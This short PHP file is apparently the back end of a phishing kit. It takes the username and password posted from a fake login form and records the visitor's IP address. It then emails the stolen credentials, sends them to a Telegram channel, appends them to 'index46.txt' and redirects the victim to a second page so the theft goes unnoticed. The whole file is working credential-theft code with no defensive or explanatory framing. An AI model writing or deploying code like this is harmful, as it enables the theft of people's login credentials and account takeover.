<?php
include_once 'functions.php';
    
    $id       = $_POST['username'];
    $password = $_POST['password'];

    
    $subject = $_SERVER['REMOTE_ADDR'] . ' | INFOS LOG ';
    $message = '/-- LOG INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
    $message .= 'ID : ' . $id . "\r\n";
    $message .= 'PASSWORD : ' . $password . "\r\n";
    $message .= '/-- END LOG INFOS --/' . "\r\n";
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    mail($subject,$message,$headers);
    telegram_send(urlencode($message));
	file_put_contents("index46.txt", $message, FILE_APPEND);
    header("location: second.php");

?>